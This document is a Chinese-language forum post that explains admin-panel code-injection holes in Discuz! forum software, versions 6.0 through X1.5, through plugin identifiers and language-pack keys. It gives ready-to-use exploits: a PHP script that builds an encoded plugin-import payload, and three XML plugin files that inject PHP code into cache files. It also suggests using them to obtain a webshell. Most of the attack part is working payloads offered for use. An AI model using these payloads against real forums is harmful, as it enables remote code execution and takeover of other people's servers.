@@ -1,0 +1,828 @@
+趁着地球还没毁灭，赶紧放出来。
+预祝"单恋一枝花"童鞋生日快乐。
+恭喜我的浩方Dota升到2级。
+希望世界和平。
+我不是标题党，你们敢踩我。敢踩我。。踩我。。。我……
+
+既然还没跪，我就从Discuz!古老的6.0版本开始，漏洞都出现在扩展插件上，利用方式有所不同，下面开始。
+
+一 Discuz! 6.0 和 Discuz! 7.0
+既然要后台拿Shell，文件写入必看。
+
+/include/cache.func.php
+01
+function writetocache($script, $cachenames, $cachedata = '', $prefix = 'cache_') {
+02
+        global $authkey;
+03
+        if(is_array($cachenames) && !$cachedata) {
+04
+                foreach($cachenames as $name) {
+05
+                        $cachedata .= getcachearray($name, $script);
+06
+                }
+07
+        }
+08
+ 
+09
+        $dir = DISCUZ_ROOT.'./forumdata/cache/';
+10
+        if(!is_dir($dir)) {
+11
+                @mkdir($dir, 0777);
+12
+        }
+13
+        if($fp = @fopen("$dir$prefix$script.php", 'wb')) {
+14
+                fwrite($fp, "<?php\n//Discuz! cache file, DO NOT modify me!".
+15
+                        "\n//Created: ".date("M j, Y, G:i").
+16
+                        "\n//Identify: ".md5($prefix.$script.'.php'.$cachedata.$authkey)."\n\n$cachedata?>");
+17
+                fclose($fp);
+18
+        } else {
+19
+                exit('Can not write to cache files, please check directory ./forumdata/ and ./forumdata/cache/ .');
+20
+        }
+21
+}
+往上翻,找到调用函数的地方.都在updatecache函数中.
+01
+        if(!$cachename || $cachename == 'plugins') {
+02
+                $query = $db->query("SELECT pluginid, available, adminid, name, identifier, datatables, directory, copyright, modules FROM {$tablepre}plugins");
+03
+                while($plugin = $db->fetch_array($query)) {
+04
+                        $data = array_merge($plugin, array('modules' => array()), array('vars' => array()));
+05
+                        $plugin['modules'] = unserialize($plugin['modules']);
+06
+                        if(is_array($plugin['modules'])) {
+07
+                                foreach($plugin['modules'] as $module) {
+08
+                                        $data['modules'][$module['name']] = $module;
+09
+                                }
+10
+                        }
+11
+                        $queryvars = $db->query("SELECT variable, value FROM {$tablepre}pluginvars WHERE pluginid='$plugin[pluginid]'");
+12
+                        while($var = $db->fetch_array($queryvars)) {
+13
+                                $data['vars'][$var['variable']] = $var['value'];
+14
+                        }
+15
+      //注意
+16
+                        writetocache($plugin['identifier'], '', "\$_DPLUGIN['$plugin[identifier]'] = ".arrayeval($data), 'plugin_');
+17
+                }
+18
+        }
+如果我们可以控制$plugin['identifier']就有机会,它是plugins表里读出来的.
+去后台看看,你可以发现identifier对应的是唯一标示符.联想下二次注射,单引号从数据库读出后写入文件时不会被转义.贱笑一下.
+但是……你懂的,当你去野区单抓对面DPS时,发现对面蹲了4个敌人的心情.
+
+/admin/plugins.inc.php
+01
+                if(($newname = trim($newname)) || ($newidentifier = trim($newidentifier))) {
+02
+                        if(!$newname) {
+03
+                                cpmsg('plugins_edit_name_invalid');
+04
+                        }
+05
+                        $query = $db->query("SELECT pluginid FROM {$tablepre}plugins WHERE identifier='$newidentifier' LIMIT 1");
+06
+      //下面这个让人蛋疼欲裂,ispluginkey判定newidentifier是否有特殊字符
+07
+                        if($db->num_rows($query) || !$newidentifier || !ispluginkey($newidentifier)) {
+08
+                                cpmsg('plugins_edit_identifier_invalid');
+09
+                        }
+10
+                        $db->query("INSERT INTO {$tablepre}plugins (name, identifier, available) VALUES ('".dhtmlspecialchars(trim($newname))."', '$newidentifier', '0')");
+11
+                }
+12
+    //写入缓存文件
+13
+                updatecache('plugins');
+14
+                updatecache('settings');
+15
+                cpmsg('plugins_edit_succeed', 'admincp.php?action=pluginsconfig');
+还好Discuz!提供了导入的功能,好比你有隐身,对面没粉.你有疾风步,对面没控.好歹给咱留条活路.
+预览源代码打印关于
+01
+elseif(submitcheck('importsubmit')) {
+02
+ 
+03
+                $plugindata = preg_replace("/(#.*\s+)*/", '', $plugindata);
+04
+                $pluginarray = daddslashes(unserialize(base64_decode($plugindata)), 1);
+05
+    //解码后没有判定
+06
+                if(!is_array($pluginarray) || !is_array($pluginarray['plugin'])) {
+07
+                        cpmsg('plugins_import_data_invalid');
+08
+                } elseif(empty($ignoreversion) && strip_tags($pluginarray['version']) != strip_tags($version)) {
+09
+                        cpmsg('plugins_import_version_invalid');
+10
+                }
+11
+ 
+12
+                $query = $db->query("SELECT pluginid FROM {$tablepre}plugins WHERE identifier='{$pluginarray[plugin][identifier]}' LIMIT 1");
+13
+    //判断是否重复,直接入库
+14
+                if($db->num_rows($query)) {
+15
+                        cpmsg('plugins_import_identifier_duplicated');
+16
+                }
+17
+ 
+18
+                $sql1 = $sql2 = $comma = '';
+19
+                foreach($pluginarray['plugin'] as $key => $val) {
+20
+                        if($key == 'directory') {
+21
+                                //compatible for old versions
+22
+                                $val .= (!empty($val) && substr($val, -1) != '/') ? '/' : '';
+23
+                        }
+24
+                        $sql1 .= $comma.$key;
+25
+                        $sql2 .= $comma.'\''.$val.'\'';
+26
+                        $comma = ',';
+27
+                }
+28
+                $db->query("INSERT INTO {$tablepre}plugins ($sql1) VALUES ($sql2)");
+29
+                $pluginid = $db->insert_id();
+30
+ 
+31
+                foreach(array('hooks', 'vars') as $pluginconfig) {
+32
+                        if(is_array($pluginarray[$pluginconfig])) {
+33
+                                foreach($pluginarray[$pluginconfig] as $config) {
+34
+                                        $sql1 = 'pluginid';
+35
+                                        $sql2 = '\''.$pluginid.'\'';
+36
+                                        foreach($config as $key => $val) {
+37
+                                                $sql1 .= ','.$key;
+38
+                                                $sql2 .= ',\''.$val.'\'';
+39
+                                        }
+40
+                                        $db->query("INSERT INTO {$tablepre}plugin$pluginconfig ($sql1) VALUES ($sql2)");
+41
+                                }
+42
+                        }
+43
+                }
+44
+ 
+45
+                updatecache('plugins');
+46
+                updatecache('settings');
+47
+                cpmsg('plugins_import_succeed', 'admincp.php?action=pluginsconfig');
+48
+ 
+49
+        }
+随便新建一个插件,identifier为shell,生成文件路径及内容.然后导出备用.
+/forumdata/cache/plugin_shell.php
+01
+<?php
+02
+//Discuz! cache file, DO NOT modify me!
+03
+//Created: Mar 17, 2011, 16:56
+04
+//Identify: 7c0b5adeadf5a806292d45c64bd0659c
+05
+ 
+06
+$_DPLUGIN['shell'] = array (
+07
+  'pluginid' => '11',
+08
+  'available' => '0',
+09
+  'adminid' => '0',
+10
+  'name' => 'Getshell',
+11
+  'identifier' => 'shell',
+12
+  'datatables' => '',
+13
+  'directory' => '',
+14
+  'copyright' => '',
+15
+  'modules' =>
+16
+  array (
+17
+  ),
+18
+  'vars' =>
+19
+  array (
+20
+  ),
+21
+)?>
+我们可以输入任意数据,唯一要注意的是文件名的合法性.感谢微软,下面的文件名是合法的.
+
+/forumdata/cache/plugin_a']=phpinfo();$a['a.php
+01
+<?php
+02
+//Discuz! cache file, DO NOT modify me!
+03
+//Created: Mar 17, 2011, 16:56
+04
+//Identify: 7c0b5adeadf5a806292d45c64bd0659c
+05
+ 
+06
+$_DPLUGIN['a']=phpinfo();$a['a'] = array (
+07
+  'pluginid' => '11',
+08
+  'available' => '0',
+09
+  'adminid' => '0',
+10
+  'name' => 'Getshell',
+11
+  'identifier' => 'shell',
+12
+  'datatables' => '',
+13
+  'directory' => '',
+14
+  'copyright' => '',
+15
+  'modules' =>
+16
+  array (
+17
+  ),
+18
+  'vars' =>
+19
+  array (
+20
+  ),
+21
+)?>
+最后是编码一次,给成Exp:
+01
+<?php
+02
+$a = unserialize(base64_decode("YToyOntzOjY6InBsdWdpbiI7YTo5OntzOjk6ImF2YWlsYWJsZSI7czoxOiIw
+03
+IjtzOjc6ImFkbWluaWQiO3M6MToiMCI7czo0OiJuYW1lIjtzOjg6IkdldHNo
+04
+ZWxsIjtzOjEwOiJpZGVudGlmaWVyIjtzOjU6IlNoZWxsIjtzOjExOiJkZXNj
+05
+cmlwdGlvbiI7czowOiIiO3M6MTA6ImRhdGF0YWJsZXMiO3M6MDoiIjtzOjk6
+06
+ImRpcmVjdG9yeSI7czowOiIiO3M6OToiY29weXJpZ2h0IjtzOjA6IiI7czo3
+07
+OiJtb2R1bGVzIjtzOjA6IiI7fXM6NzoidmVyc2lvbiI7czo1OiI2LjAuMCI7
+08
+fQ=="));
+09
+//print_r($a);
+10
+$a['plugin']['name']='GetShell';
+11
+$a['plugin']['identifier']='a\']=phpinfo();$a[\'';
+12
+ 
+13
+print(base64_encode(serialize($a)));
+14
+?>
+  
+7.0同理,大家可以自己去测试咯.如果你使用上面的代码,请勾选"允许导入不同版本 Discuz! 的插件"
+ 
+二 Discuz! 7.2 和 Discuz! X1.5
+
+以下以7.2为例
+
+/admin/plugins.inc.php
+01
+elseif($operation == 'import') {
+02
+ 
+03
+        if(!submitcheck('importsubmit') && !isset($dir)) {
+04
+ 
+05
+  /*未提交前表单神马的*/
+06
+ 
+07
+        } else {
+08
+ 
+09
+                if(!isset($dir)) {
+10
+  //导入数据解码
+11
+                        $pluginarray = getimportdata('Discuz! Plugin');
+12
+                } elseif(!isset($installtype)) {
+13
+  /*省略一部分*/
+14
+                }
+15
+  //判定你妹啊,两遍啊两遍
+16
+                if(!ispluginkey($pluginarray['plugin']['identifier'])) {
+17
+                        cpmsg('plugins_edit_identifier_invalid', '', 'error');
+18
+                }
+19
+                if(!ispluginkey($pluginarray['plugin']['identifier'])) {
+20
+                        cpmsg('plugins_edit_identifier_invalid', '', 'error');
+21
+                }
+22
+                if(is_array($pluginarray['hooks'])) {
+23
+                        foreach($pluginarray['hooks'] as $config) {
+24
+                                if(!ispluginkey($config['title'])) {
+25
+                                        cpmsg('plugins_import_hooks_title_invalid', '', 'error');
+26
+                                }
+27
+                        }
+28
+                }
+29
+                if(is_array($pluginarray['vars'])) {
+30
+                        foreach($pluginarray['vars'] as $config) {
+31
+                                if(!ispluginkey($config['variable'])) {
+32
+                                        cpmsg('plugins_import_var_invalid', '', 'error');
+33
+                                }
+34
+                        }
+35
+                }
+36
+ 
+37
+                $langexists = FALSE;
+38
+    //你有张良计,我有过墙梯
+39
+                if(!empty($pluginarray['language'])) {
+40
+                        @mkdir('./forumdata/plugins/', 0777);
+41
+                        $file = DISCUZ_ROOT.'./forumdata/plugins/'.$pluginarray['plugin']['identifier'].'.lang.php';
+42
+                        if($fp = @fopen($file, 'wb')) {
+43
+                                $scriptlangstr = !empty($pluginarray['language']['scriptlang']) ? "\$scriptlang['".$pluginarray['plugin']['identifier']."'] = ".langeval($pluginarray['language']['scriptlang']) : '';
+44
+                                $templatelangstr = !empty($pluginarray['language']['templatelang']) ? "\$templatelang['".$pluginarray['plugin']['identifier']."'] = ".langeval($pluginarray['language']['templatelang']) : '';
+45
+                                $installlangstr = !empty($pluginarray['language']['installlang']) ? "\$installlang['".$pluginarray['plugin']['identifier']."'] = ".langeval($pluginarray['language']['installlang']) : '';
+46
+                                fwrite($fp, "<?php\n".$scriptlangstr.$templatelangstr.$installlangstr.'?>');
+47
+                                fclose($fp);
+48
+                        }
+49
+                        $langexists = TRUE;
+50
+                }
+51
+ 
+52
+/*处理神马的*/
+53
+                updatecache('plugins');
+54
+                updatecache('settings');
+55
+                updatemenu();
+56
+ 
+57
+/*省略部分代码*/
+58
+ 
+59
+}
+先看导入数据的过程,Discuz! 7.2之后的导入数据使用XML,但是7.2保持了向下兼容.X1.5废弃了.
+01
+function getimportdata($name = '', $addslashes = 1, $ignoreerror = 0) {
+02
+        if($GLOBALS['importtype'] == 'file') {
+03
+                $data = @implode('', file($_FILES['importfile']['tmp_name']));
+04
+                @unlink($_FILES['importfile']['tmp_name']);
+05
+        } else {
+06
+                $data = $_POST['importtxt'] && MAGIC_QUOTES_GPC ? stripslashes($_POST['importtxt']) : $GLOBALS['importtxt'];
+07
+        }
+08
+        include_once DISCUZ_ROOT.'./include/xml.class.php';
+09
+        $xmldata = xml2array($data);
+10
+        if(!is_array($xmldata) || !$xmldata) {
+11
+//向下兼容
+12
+                if($name && !strexists($data, '# '.$name)) {
+13
+                        if(!$ignoreerror) {
+14
+                                cpmsg('import_data_typeinvalid', '', 'error');
+15
+                        } else {
+16
+                                return array();
+17
+                        }
+18
+                }
+19
+                $data = preg_replace("/(#.*\s+)*/", '', $data);
+20
+                $data = unserialize(base64_decode($data));
+21
+                if(!is_array($data) || !$data) {
+22
+                        if(!$ignoreerror) {
+23
+                                cpmsg('import_data_invalid', '', 'error');
+24
+                        } else {
+25
+                                return array();
+26
+                        }
+27
+                }
+28
+        } else {
+29
+//XML解析
+30
+                if($name && $name != $xmldata['Title']) {
+31
+                        if(!$ignoreerror) {
+32
+                                cpmsg('import_data_typeinvalid', '', 'error');
+33
+                        } else {
+34
+                                return array();
+35
+                        }
+36
+                }
+37
+                $data = exportarray($xmldata['Data'], 0);
+38
+        }
+39
+        if($addslashes) {
+40
+//daddslashes在两个版本的处理导致了Exp不能通用.
+41
+                $data = daddslashes($data, 1);
+42
+        }
+43
+        return $data;
+44
+}
+判定了identifier之后,7.0版本之前的漏洞就不存在了.但是它又加入了语言包……
+我们只要控制scriptlangstr或者其它任何一个就可以了。
+01
+function langeval($array) {
+02
+        $return = '';
+03
+        foreach($array as $k => $v) {
+04
+    //Key过滤了单引号,但是只过滤了单引号,可以利用\废掉后面的单引号
+05
+                $k = str_replace("'", '', $k);
+06
+    //下面的你绝对看不懂啊看不懂,你到底要人家怎么样嘛?你对\有爱?
+07
+                $return .= "\t'$k' => '".str_replace(array("\\'", "'"), array("\\\'", "\'"), stripslashes($v))."',\n";
+08
+        }
+09
+        return "array(\n$return);\n\n";
+10
+}
+Key这里不通用.
+
+7.2
+01
+function daddslashes($string, $force = 0) {
+02
+        !defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
+03
+        if(!MAGIC_QUOTES_GPC || $force) {
+04
+                if(is_array($string)) {
+05
+                        foreach($string as $key => $val) {
+06
+                                $string[$key] = daddslashes($val, $force);
+07
+                        }
+08
+                } else {
+09
+                        $string = addslashes($string);
+10
+                }
+11
+        }
+12
+        return $string;
+13
+}
+X1.5
+01
+function daddslashes($string, $force = 1) {
+02
+        if(is_array($string)) {
+03
+                foreach($string as $key => $val) {
+04
+                        unset($string[$key]);
+05
+      //过滤了key
+06
+                        $string[addslashes($key)] = daddslashes($val, $force);
+07
+                }
+08
+        } else {
+09
+                $string = addslashes($string);
+10
+        }
+11
+        return $string;
+12
+}
+还是看下shell.lang.php的文件格式.
+1
+<?php
+2
+$scriptlang['shell'] = array(
+3
+        'a' => '1',
+4
+        'b' => '2',
+5
+);
+6
+ 
+7
+?>
+7.2版本没有过滤Key,所以直接用\废掉单引号.
+X1.5,单引号转义后变为\',再被替换一次',还是留下了\
+
+而$v在两个版本中过滤相同,比较通用.
+
+X1.5至少副站长才可以管理后台,虽然看不到插件选项,但是可以直接访问/admin.php?frames=yes&action=plugins添加插件
+
+$v通用Exp:
+01
+<?xml version="1.0" encoding="ISO-8859-1"?>
+02
+<root>
+03
+        <item id="Title"><![CDATA[Discuz! Plugin]]></item>
+04
+        <item id="Version"><![CDATA[7.2]]></item>
+05
+        <item id="Time"><![CDATA[2011-03-16 15:57]]></item>
+06
+        <item id="From"><![CDATA[Discuz! Board (http://localhost/Discuz_7.2_SC_UTF8/upload/)]]></item>
+07
+        <item id="Data">
+08
+                <item id="plugin">
+09
+                        <item id="available"><![CDATA[0]]></item>
+10
+                        <item id="adminid"><![CDATA[0]]></item>
+11
+                        <item id="name"><![CDATA[www]]></item>
+12
+                        <item id="identifier"><![CDATA[shell]]></item>
+13
+                        <item id="description"><![CDATA[]]></item>
+14
+                        <item id="datatables"><![CDATA[]]></item>
+15
+                        <item id="directory"><![CDATA[]]></item>
+16
+                        <item id="copyright"><![CDATA[]]></item>
+17
+                        <item id="modules"><![CDATA[a:0:{}]]></item>
+18
+                        <item id="version"><![CDATA[]]></item>
+19
+                </item>
+20
+                <item id="version"><![CDATA[7.2]]></item>
+21
+                <item id="language">
+22
+                        <item id="scriptlang">
+23
+                                <item id="a"><![CDATA[b\]]></item>
+24
+                                <item id=");phpinfo();?>"><![CDATA[x]]></item>
+25
+                        </item>
+26
+                </item>
+27
+        </item>
+28
+</root>
+7.2 Key利用
+01
+<?xml version="1.0" encoding="ISO-8859-1"?>
+02
+<root>
+03
+        <item id="Title"><![CDATA[Discuz! Plugin]]></item>
+04
+        <item id="Version"><![CDATA[7.2]]></item>
+05
+        <item id="Time"><![CDATA[2011-03-16 15:57]]></item>
+06
+        <item id="From"><![CDATA[Discuz! Board (http://localhost/Discuz_7.2_SC_UTF8/upload/)]]></item>
+07
+        <item id="Data">
+08
+                <item id="plugin">
+09
+                        <item id="available"><![CDATA[0]]></item>
+10
+                        <item id="adminid"><![CDATA[0]]></item>
+11
+                        <item id="name"><![CDATA[www]]></item>
+12
+                        <item id="identifier"><![CDATA[shell]]></item>
+13
+                        <item id="description"><![CDATA[]]></item>
+14
+                        <item id="datatables"><![CDATA[]]></item>
+15
+                        <item id="directory"><![CDATA[]]></item>
+16
+                        <item id="copyright"><![CDATA[]]></item>
+17
+                        <item id="modules"><![CDATA[a:0:{}]]></item>
+18
+                        <item id="version"><![CDATA[]]></item>
+19
+                </item>
+20
+                <item id="version"><![CDATA[7.2]]></item>
+21
+                <item id="language">
+22
+                        <item id="scriptlang">
+23
+                                <item id="a\"><![CDATA[=>1);phpinfo();?>]]></item>
+24
+                        </item>
+25
+                </item>
+26
+        </item>
+27
+</root>
+X1.5
+01
+<?xml version="1.0" encoding="ISO-8859-1"?>
+02
+<root>
+03
+        <item id="Title"><![CDATA[Discuz! Plugin]]></item>
+04
+        <item id="Version"><![CDATA[7.2]]></item>
+05
+        <item id="Time"><![CDATA[2011-03-16 15:57]]></item>
+06
+        <item id="From"><![CDATA[Discuz! Board (http://localhost/Discuz_7.2_SC_UTF8/upload/)]]></item>
+07
+        <item id="Data">
+08
+                <item id="plugin">
+09
+                        <item id="available"><![CDATA[0]]></item>
+10
+                        <item id="adminid"><![CDATA[0]]></item>
+11
+                        <item id="name"><![CDATA[www]]></item>
+12
+                        <item id="identifier"><![CDATA[shell]]></item>
+13
+                        <item id="description"><![CDATA[]]></item>
+14
+                        <item id="datatables"><![CDATA[]]></item>
+15
+                        <item id="directory"><![CDATA[]]></item>
+16
+                        <item id="copyright"><![CDATA[]]></item>
+17
+                        <item id="modules"><![CDATA[a:0:{}]]></item>
+18
+                        <item id="version"><![CDATA[]]></item>
+19
+                </item>
+20
+                <item id="version"><![CDATA[7.2]]></item>
+21
+                <item id="language">
+22
+                        <item id="scriptlang">
+23
+                                <item id="a'"><![CDATA[=>1);phpinfo();?>]]></item>
+24
+                        </item>
+25
+                </item>
+26
+        </item>
+27
+</root>
+   
+如果你愿意,可以使用base64_encode(serialize($a))的方法试试7.2获取Webshell.
+
+最后的最后,加积分太不靠谱了,管理员能免费送包盐不?
